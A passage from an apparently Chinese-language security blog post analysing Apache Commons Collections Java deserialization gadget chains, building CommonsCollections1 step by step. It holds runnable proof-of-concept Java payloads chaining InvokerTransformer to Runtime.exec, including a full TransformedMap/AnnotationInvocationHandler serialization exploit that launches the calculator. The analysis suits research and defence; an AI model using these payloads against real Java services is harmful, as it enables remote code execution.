<li><code>BadAttributeValueExpException.readObject()</code>&#x5F53;<code>System.getSecurityManager()</code>&#x4E3A;<code>null</code>&#x65F6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>TiedMapEntry.toString()</code>&#xFF0C;&#x5B83;&#x5728;<code>getValue()</code>&#x65F6;&#x4F1A;&#x901A;&#x8FC7;<code>LazyMap.get()</code>&#x53D6;&#x503C;&#xFF0C;&#x6700;&#x7EC8;&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
<li>CommonsCollections6<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>HashSet</code></li>
<li><code>HashSet.readObject()</code>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5404;&#x5143;&#x7D20;&#x540E;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>HashMap.put()</code>&#x5C06;&#x7ED3;&#x679C;&#x653E;&#x8FDB;&#x53BB;&#xFF0C;&#x800C;&#x5B83;&#x901A;&#x8FC7;<code>TiedMapEntry.hashCode()</code>&#x8BA1;&#x7B97;hash&#x65F6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>getValue()</code>&#x89E6;&#x53D1;<code>LazyMap.get()</code>&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
<li>CommonsCollections7<ul>
<li>&#x547D;&#x4EE4;&#x6267;&#x884C;&#x8F7D;&#x4F53;&#xFF1A;<code>org.apache.commons.collections.functors.ChainedTransformer</code></li>
<li>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8F7D;&#x4F53;&#xFF1A;<code>Hashtable</code></li>
<li><code>Hashtable#readObject</code>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5404;&#x5143;&#x7D20;&#x540E;&#xFF0C;&#x4F1A;&#x8C03;&#x7528;<code>reconstitutionPut</code>&#xFF0C;&#x540E;&#x9762;&#x5229;&#x7528;&#x94FE;&#x4E2D;&#x5728;&#x6BD4;&#x8F83;hash&#x503C;&#x7684;&#x65F6;&#x5019;&#x7528;&#x5230;&#x4E86;hashcode&#x76F8;&#x7B49;&#x7684;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x4E32; yy &#x548C; zZ&#x3002;&#x6700;&#x540E;&#x540E;<code>AbstractMap#equals</code> &#x89E6;&#x53D1;<code>LazyMap.get()</code>&#x5BFC;&#x81F4;&#x547D;&#x4EE4;&#x6267;&#x884C;</li>
</ul>
</li>
</ul>
<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x7406;&#x6E05;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x65B9;&#x9762;</p>
<ul>
<li>Transformer</li>
<li>ConstantTransformer</li>
<li>InvokerTransformer</li>
<li>ChainedTransformer</li>
<li>AnnotationInvocationHandler</li>
</ul>
<p>&#x6839;&#x636E;&#x5176;&#x6E90;&#x7801;&#xFF0C;&#x7ED3;&#x5408; java.lang.Runtime &#x53EF;&#x4EE5;&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F; Runtime &#x4E3A;&#x5355;&#x4F8B;&#x6A21;&#x5F0F;&#xFF0C;&#x800C;&#x4E14;&#x6CA1;&#x6709;&#x7EE7;&#x627F; Serializable&#xFF0C; &#x56E0;&#x6B64;&#x8C03;&#x7528; getRuntime &#x4E4B;&#x540E;&#x83B7;&#x5F97;&#x7684;&#x7C7B;&#x5B9E;&#x4F8B;&#x4E0D;&#x80FD;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x524D;&#x63D0;&#x662F;&#x8C03;&#x7528;&#x6784;&#x9020;&#x7684; ChainedTransformer &#x7684; transform&#x3002;&#x7531;&#x6B64;&#x6784;&#x9020;&#x51FA;&#x6765;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
<p><strong>Level-0 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        ChainedTransformer demo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;open -a Calculator&quot;</span>})});</span><br><span class="line">        demo.transform(String.class);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5F04;&#x6E05;&#x695A;&#x4E0A;&#x8FF0; payload &#x53EA;&#x9700;&#x8981;&#x89E3;&#x51B3;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x95EE;&#x9898;&#xFF1A;</p>
<ol>
<li>&#x5404; Transformer &#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x4EE5;&#x53CA;&#x4ED6;&#x4EEC;&#x4E4B;&#x95F4;&#x7684;&#x8054;&#x7CFB;</li>
<li>&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x8FD4;&#x56DE;&#x539F;&#x672C;&#x4F20;&#x5165;&#x5BF9;&#x8C61;&#x7684; ConstantTransformer &#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E0D;&#x662F;&#x591A;&#x6B64;&#x4E00;&#x4E3E;&#x4E48;&#xFF1F;</li>
<li>&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981;&#x53CD;&#x5C04;&#x8C03;&#x7528; getRuntime&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x76F4;&#x63A5;&#x4F20;&#x5165; Runtime.getRuntime &#xFF1F;</li>
</ol>
<p>CommonsCollections1 &#x7F51;&#x4E0A;&#x7684; POC &#x5176;&#x5B9E;&#x4E5F;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x4E24;&#x4E2A;&#x5229;&#x7528;&#x94FE;</p>
<ul>
<li>TransformedMap&#xFF08;&#x7F51;&#x4E0A;&#x6D41;&#x4F20;&#x7684;&#x5229;&#x7528;&#x94FE;&#xFF09;</li>
<li>LazyMap &#xFF08;ysoserial &#x4E2D;&#x5229;&#x7528;&#x94FE;&#xFF09;</li>
</ul>
<p>&#x8FD9;&#x91CC;&#x5F15;&#x7528; @phithon &#x5E08;&#x5085; Java&#x5B89;&#x5168;&#x6F2B;&#x8C08; &#x7684;&#x4E00;&#x6BB5;&#x8BDD;</p>
<blockquote>
<p>&#x65E2;&#x7136;ysoserial&#x4E2D;&#x6CA1;&#x6709;&#x7528;&#x5230;TransformedMap&#xFF0C;&#x90A3;&#x4E48;TransformedMap&#x7A76;&#x7ADF;&#x662F;&#x8C01;&#x6700;&#x5148;&#x63D0;&#x51FA;&#x6765;&#x7684;&#x5462;&#xFF1F; &#x636E;&#x6211;&#x7684;&#x8003;&#x8BC1;&#xFF0C;&#x6700;&#x65E9;&#x8BB2;&#x5230;TransformedMap&#x5E94;&#x8BE5;&#x662F;Code White&#x7684;&#x8FD9;&#x7BC7;Slide&#xFF1A;Exploiting Deserialization Vulnerabilities in Java&#xFF0C;&#x540E;&#x6765;&#x957F;&#x4EAD;&#x79D1;&#x6280;&#x7684;&#x535A;&#x5BA2;&#x6587;&#x7AE0;&#x300A;Lib&#x4E4B;&#x8FC7;&#xFF1F;Java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E; &#x901A;&#x7528;&#x5229;&#x7528;&#x5206;&#x6790;&#x300B;&#x5BF9;&#x6B64;&#x8FDB;&#x884C;&#x4E86;&#x8FDB;&#x4E00;&#x6B65;&#x5206;&#x6790;&#xFF0C;&#x540E;&#x6765;&#x624D;&#x5728;&#x56FD;&#x5185;&#x4F17;&#x591A;&#x6587;&#x7AE0;&#x4E2D;&#x88AB;&#x8BB2;&#x5230;&#x3002;</p>
</blockquote>
<p>&#x5176;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x5DEE;&#x522B;&#x5728;&#x4E8E;&#x6267;&#x884C; <code>transform</code> &#x7684;&#x4E0D;&#x540C;</p>
<p>&#x76F8;&#x540C;&#x7684;&#x662F;&#x5747;&#x65E0;&#x6CD5;&#x89E3;&#x51B3; CommonCollections1 &#x8FD9;&#x6761;&#x5229;&#x7528;&#x94FE;&#x5728;&#x9AD8;&#x7248;&#x672C;Java&#xFF08;8u71&#x4EE5;&#x540E;&#xFF09;&#x4E2D;&#x7684;&#x4F7F;&#x7528;&#x95EE;&#x9898;</p>
<h2 id="TransformedMap-Gadget-chain"><a href="#TransformedMap-Gadget-chain" class="headerlink" title="TransformedMap Gadget chain"></a>TransformedMap Gadget chain</h2><p>&#x5229;&#x7528;&#x94FE;&#x662F; TransformedMap &#xFF0C;&#x5148;&#x5BF9;&#x6211;&#x4EEC;&#x4E4B;&#x524D; level-0 &#x7684; payload &#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x5347;&#x7EA7;&#xFF0C;&#x540C;&#x6837;&#x662F;&#x6700;&#x57FA;&#x7840;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x76F4;&#x63A5;&#x4F7F;&#x7528; ChainedTransformer &#x7684; transform &#x65B9;&#x6CD5;&#x89E6;&#x53D1;&#xFF0C;&#x800C;&#x6539;&#x7528; TransformedMap &#x7684;&#x65B9;&#x6CD5;</p>
<p>&#x9996;&#x5148; TransformedMap &#x4E2D;&#x6709;&#x8FD9;&#x4E09;&#x4E2A;&#x7C7B;&#x8C03;&#x7528;&#x4E86; transform &#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x90FD;&#x662F; protected &#x65B9;&#x6CD5;&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x627E;&#x5230;&#x95F4;&#x63A5;&#x8C03;&#x7528;&#x5B83;&#x4EEC;&#x7684;&#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210004211853.png" alt></p>
<p>&#x4E0B;&#x9762;&#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#x95F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;  transformKey &#x548C; transformValue &#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x4E14;&#x90FD;&#x662F; public &#x65B9;&#x6CD5;&#xFF08;checkSetValue &#x65B9;&#x6CD5;&#x540E;&#x6587;&#x518D;&#x63D0;&#xFF09;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210004917701.png" alt></p>
<p><strong>Level-1 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;open -a Calculator&quot;</span>)})});</span><br><span class="line">        TransformedMap outerMap = (TransformedMap) TransformedMap.decorate(<span class="hljs-keyword">new</span> HashMap&lt;String, String&gt;(), <span class="hljs-keyword">null</span>, chainDemo);</span><br><span class="line">        outerMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E24;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#x5982;&#x4E0B;</p>
<p>&#x9996;&#x5148;&#x8C03;&#x7528; <code>decorate</code> &#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#x5BF9;  <code>valueTransformer</code> &#x8FDB;&#x884C;&#x4E86;&#x9644;&#x503C;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;&#x4E86;&#x4E00;&#x4E2A; TransformedMap &#x5BF9;&#x8C61;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209184506179.png" alt></p>
<p>&#x540E;&#x7EED;&#x5728; <code>TransformedMap#transformValue</code> &#x8C03;&#x7528;&#x4E86; <code>transform</code> &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209184258134.png" alt></p>
<p>debug &#x4E00;&#x4E0B;&#x6211;&#x4EEC;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x662F;&#x8FD9;&#x4E48;&#x5199;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">outMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-keyword">null</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x867D;&#x7136;&#x80FD;&#x591F;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x662F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x9700;&#x8981;&#x7528;&#x5230;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x70B9;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5BF9;&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6539;&#x8FDB;&#xFF0C;&#x4F7F;&#x5176;&#x66F4;&#x63A5;&#x8FD1;&#x6211;&#x4EEC;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x8C03;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x7528;&#x5230;&#x4E0A;&#x6587;&#x6211;&#x4EEC;&#x63D0;&#x5230;&#x8FC7;&#x7684; checkSetValue</p>
<p><a href="https://wooyun.js.org/drops/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95.html" target="_blank" rel="noopener"><strong>Level-2 payload</strong></a></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;open -a Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, chainDemo);</span><br><span class="line">        Map.Entry entryDemo = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        entryDemo.setValue(<span class="hljs-keyword">null</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>outerMap</code> &#x7ECF;&#x8FC7; <code>entrySet</code> -&gt; <code>iterator</code> -&gt; <code>next</code> &#x65B9;&#x6CD5;&#xFF0C; &#x6700;&#x7EC8;&#x4F7F; <code>MapEntry</code>&#x7C7B;&#x7684; <code>this.parent</code> &#x53D8;&#x91CF;&#x88AB;&#x9644;&#x503C;&#x6210; TransformedMap&#x7C7B;&#x7684;&#x5BF9;&#x8C61; <code>outerMap</code></p>
<p>&#x5728;&#x6700;&#x540E;&#x8C03;&#x7528;&#x7684;&#x65F6;&#x5019;&#x5148;&#x89E6;&#x53D1; <code>MapEntry</code> &#x7684;  <code>setValue</code> </p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209205806502.png" alt></p>
<p>&#x7136;&#x540E;&#x8C03;&#x7528;&#x5176;&#x65E9;&#x5C31;&#x6784;&#x9020;&#x597D;&#x7684; <code>valueTransformer</code> &#x7684; <code>transform</code> &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209210130168.png" alt></p>
<p>&#x5BF9;&#x4E8E;&#x76EE;&#x524D;&#x6765;&#x8BF4;&#xFF0C;&#x624B;&#x52A8;&#x89E6;&#x53D1;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x663E;&#x7136;&#x8FBE;&#x4E0D;&#x5230;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x7684;&#x6807;&#x51C6;&#xFF0C;&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4ECE; <code>readObject</code> &#x5F00;&#x59CB;&#x4E0B;&#x624B;&#x3002;&#x4E8E;&#x662F;&#x627E;&#x5230; AnnotationInvocationHandler &#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x8FD9;&#x4E2A;&#x7C7B;&#x4E0D;&#x80FD;&#x88AB;&#x5916;&#x90E8;&#x7C7B;&#x8BBF;&#x95EE;&#x5230;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x53CD;&#x5C04;&#x53BB;&#x8C03;&#x7528;&#x5B83;</p>
<p><strong>Level-3 TransformedMap &#x5229;&#x7528;&#x94FE; payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformedMapDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, chainDemo);</span><br><span class="line">        Constructor construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">              </span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209221024520.png" alt></p>
<p>&#x8C03;&#x7528;&#x6808;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">transform:121, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:169, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:191, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">readObject:353, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1004, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1891, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1796, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1348, ObjectInputStream (java.io)</span><br><span class="line">readObject:370, ObjectInputStream (java.io)</span><br><span class="line">main:44, TransformedMapDemo (com.p2hm1n.cc.cc1)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x770B;&#x4E00;&#x4E0B; <code>AnnotationInvocationHandler#readObject</code> &#x5927;&#x6982;&#x5C31;&#x77E5;&#x9053;&#x4E86;&#xFF0C;&#x5728;&#x8C03;&#x7528; <code>setValue</code> &#x540E;&#x5C31;&#x8DDF; level-2 &#x7684;payload &#x4E00;&#x6837;&#x4E86;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209222512595.png" alt></p>
<p>&#x63D0;&#x70BC;&#x4E00;&#x4E0B; <code>AnnotationInvocationHandler</code> &#x7684;&#x7279;&#x5F81;</p>
<ul>
<li>&#x7C7B;&#x7684;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x63A5;&#x6536;Map&#x5BF9;&#x8C61;</li>
<li>&#x8FD9;&#x4E2A;&#x7C7B;&#x9700;&#x8981;&#x91CD;&#x5199; readObject&#x65B9;&#x6CD5;&#xFF0C;&#x91CD;&#x5199;&#x7684; readObject &#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x8C03;&#x7528;&#x5230; <code>AbstractMapEntryDecorator</code>&#x5B50;&#x7C7B; <code>MapEntry</code> &#x7684; <code>setValue</code>&#x65B9;&#x6CD5;</li>
</ul>
<p>&#x4E0B;&#x9762;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A; <strong>payload &#x7684;&#x9650;&#x5236;&#xFF1A;<code>innerMap.put(&quot;value&quot;, &quot;random&quot;);</code></strong></p>
